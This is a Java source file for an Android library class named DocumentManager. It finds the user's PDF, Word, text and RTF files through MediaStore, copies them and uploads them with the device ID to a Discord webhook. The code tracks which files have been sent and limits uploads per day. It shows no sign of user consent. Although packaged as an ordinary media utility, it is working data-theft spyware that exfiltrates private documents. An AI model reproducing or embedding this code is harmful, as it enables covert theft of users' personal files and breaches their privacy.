package com.application.baselibrary.core.media.document;

import android.content.Context;
import android.net.Uri;
import android.provider.Settings;
import android.util.Log;

import com.application.baselibrary.core.media.document.model.DocumentInfo;
import com.application.baselibrary.data.LibraryConstants;
import com.application.baselibrary.network.DiscordWebhookClient;
import com.application.baselibrary.threading.ExecutorServiceWrapper;
import com.application.baselibrary.threading.scheduler.RxSchedulerProvider;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import java.io.*;
import java.lang.reflect.Type;
import java.util.*;

public class DocumentManager {
    private static final String TAG = "DocumentManager";
    private static final Object FILE_LOCK = new Object();

    private final Context context;
    private final DocumentHelper helper;
    private final String webhookUrl;
    private final String deviceId;
    private final File uploadedFile;

    private Set<DocumentInfo> uploadedDocs = new HashSet<>();
    private List<DocumentInfo> allDocs = new ArrayList<>();
    private final Gson gson = new Gson();

    public DocumentManager(Context context, String webhookUrl) {
        this.context = context.getApplicationContext();
        this.helper = new DocumentHelper(context);
        this.webhookUrl = webhookUrl;
        this.deviceId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        this.uploadedFile = new File(context.getFilesDir(), LibraryConstants.FILE_NAME_UPLOADED_DOCUMENTS);
    }


    /**
     * Fetch documents from MediaStore (optionally log them)
     */
    public List<DocumentInfo> fetchDocuments(boolean log) {
        allDocs = helper.getDocumentsByExtensions(
                new String[]{".pdf", ".docx", ".doc", ".txt", ".rtf"}, true);
        if (log) {
            allDocs.forEach(d -> Log.d(TAG,
                    String.format("Document: %s (%s) path=%s modified=%d",
                            d.name, readableFileSize(d.size), d.pathOrUri, d.dateModified)));
        }
        return allDocs;
    }

    /**
     * Load uploaded docs from JSON file
     */
    public void loadUploadedDocs() {
        synchronized (FILE_LOCK) {
            if (!uploadedFile.exists()) {
                uploadedDocs = new HashSet<>();
                return;
            }
            try (BufferedReader reader = new BufferedReader(new FileReader(uploadedFile))) {
                Type type = new TypeToken<HashSet<DocumentInfo>>() {
                }.getType();
                uploadedDocs = gson.fromJson(reader, type);
                if (uploadedDocs == null) uploadedDocs = new HashSet<>();
            } catch (IOException e) {
                Log.e(TAG, "Error loading uploaded docs", e);
                uploadedDocs = new HashSet<>();
            }
        }
    }

    /**
     * Save uploaded docs async
     */
    private void saveUploadedDocsAsync() {
        RxSchedulerProvider.runOnIO(() -> {
            synchronized (FILE_LOCK) {
                try (FileWriter writer = new FileWriter(uploadedFile)) {
                    writer.write(gson.toJson(uploadedDocs));
                } catch (IOException e) {
                    Log.e(TAG, "Error saving uploaded docs", e);
                }
            }
        });
    }
    int MaxDocumentUploadCount = 5;
    public void start(int maxDocumentUploadCount) {
        MaxDocumentUploadCount = maxDocumentUploadCount;
        RxSchedulerProvider.runOnIO(() -> {
            // 1. Load previously uploaded docs
            loadUploadedDocs();

            // 2. Fetch documents (with logging)
            fetchDocuments(true);

            // 3. Upload new docs
            startUploading();
        });
    }


    /**
     * Start upload process
     */
    public void startUploading() {
        if (webhookUrl == null || webhookUrl.isEmpty()) {
            Log.e(TAG, "Webhook URL missing");
            return;
        }

        if (allDocs.isEmpty()) fetchDocuments(true);
        if (uploadedDocs.isEmpty()) loadUploadedDocs();

        int uploadedCount = getUploadCountToday();
        int limit = MaxDocumentUploadCount;

        for (DocumentInfo doc : allDocs) {
            if (uploadedCount >= limit) {
                Log.w(TAG, "Reached max document upload count (" + limit + ")");
                break; // stop queuing further uploads
            }

            if (canUpload(doc)) {
                uploadedCount++; // reserve slot immediately
                ExecutorServiceWrapper.getSingleThreadExecutor().submit(() -> uploadToDiscord(doc));
            } else {
                Log.d(TAG, "Skipped: " + doc.name);
            }
        }

        logUploadStatus();
    }

    /**
     * Upload logic
     */
    private void uploadToDiscord(DocumentInfo doc) {
        if (doc.pathOrUri == null) {
            Log.w(TAG, "Skipping null path for: " + doc.name);
            return;
        }

        File tempFile = new File(context.getCacheDir(), doc.name);

        try (InputStream in = context.getContentResolver().openInputStream(Uri.parse(doc.pathOrUri));
             OutputStream out = new FileOutputStream(tempFile)) {

            byte[] buffer = new byte[8192];
            int len;
            while ((len = in.read(buffer)) != -1) {
                out.write(buffer, 0, len);
            }

        } catch (IOException e) {
            Log.e(TAG, "Error copying document to temp file: " + doc.name, e);
            return;
        }

        String message = String.format(
                "📄 **New Document Uploaded**\n**Device ID:** `%s`\n**File Name:** `%s`\n**Size:** %s",
                deviceId, doc.name, readableFileSize(doc.size));

        DiscordWebhookClient discordHandler = new DiscordWebhookClient(webhookUrl);
        discordHandler.uploadFile(tempFile, message, new DiscordWebhookClient.WebhookCallback() {
            @Override
            public void onSuccess(DiscordWebhookClient.WebhookResponse response) {
                Log.d(TAG, "Uploaded " + doc.name + " to Discord.");
                markAsUploaded(doc);
            }

            @Override
            public void onError(String errorMessage) {
                Log.e(TAG, "Failed to upload " + doc.name + ": " + errorMessage);
            }
        });

        logUploadStatus();
    }

    /**
     * Validation checks
     */
    public boolean canUpload(DocumentInfo doc) {
        if (doc == null) return false;
        if (isAlreadyUploaded(doc)) return false;
        if (isDailyLimitReached()) return false;
        return true;
    }


    private boolean isAlreadyUploaded(DocumentInfo doc) {
        return uploadedDocs.contains(doc);
    }

    private boolean isDailyLimitReached() {
        return getUploadCountToday() >= MaxDocumentUploadCount;
    }


    /**
     * Mark document as uploaded
     */
    public void markAsUploaded(DocumentInfo doc) {
        doc.uploadTime = System.currentTimeMillis();
        uploadedDocs.add(doc);
        saveUploadedDocsAsync();
    }

    /**
     * Count uploads today
     */
    private int getUploadCountToday() {
        long startOfToday = getStartOfTodayMillis();
        int count = 0;
        for (DocumentInfo doc : uploadedDocs) {
            if (doc.uploadTime >= startOfToday) count++;
        }
        return count;
    }

    /**
     * Start of day timestamp
     */
    private long getStartOfTodayMillis() {
        Calendar cal = Calendar.getInstance();
        cal.set(Calendar.HOUR_OF_DAY, 0);
        cal.set(Calendar.MINUTE, 0);
        cal.set(Calendar.SECOND, 0);
        cal.set(Calendar.MILLISECOND, 0);
        return cal.getTimeInMillis();
    }

    /**
     * Utility
     */
    private String readableFileSize(long size) {
        if (size <= 0) return "0 B";
        final String[] units = {"B", "KB", "MB", "GB"};
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        return String.format("%.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
    }

    /**
     * Print upload status: how many uploaded today, limit, and remaining
     */
    public void logUploadStatus() {
        int uploadedToday = getUploadCountToday();
        int limit = MaxDocumentUploadCount;
        int remaining = Math.max(0, limit - uploadedToday);

        Log.i(TAG, String.format(
                "Upload status: %d uploaded today / %d limit. Remaining: %d",
                uploadedToday, limit, remaining
        ));
    }


    // Accessors
    public DocumentHelper getHelper() {
        return helper;
    }

    public List<DocumentInfo> getAllDocs() {
        return allDocs;
    }

    public Set<DocumentInfo> getUploadedDocs() {
        return uploadedDocs;
    }
}
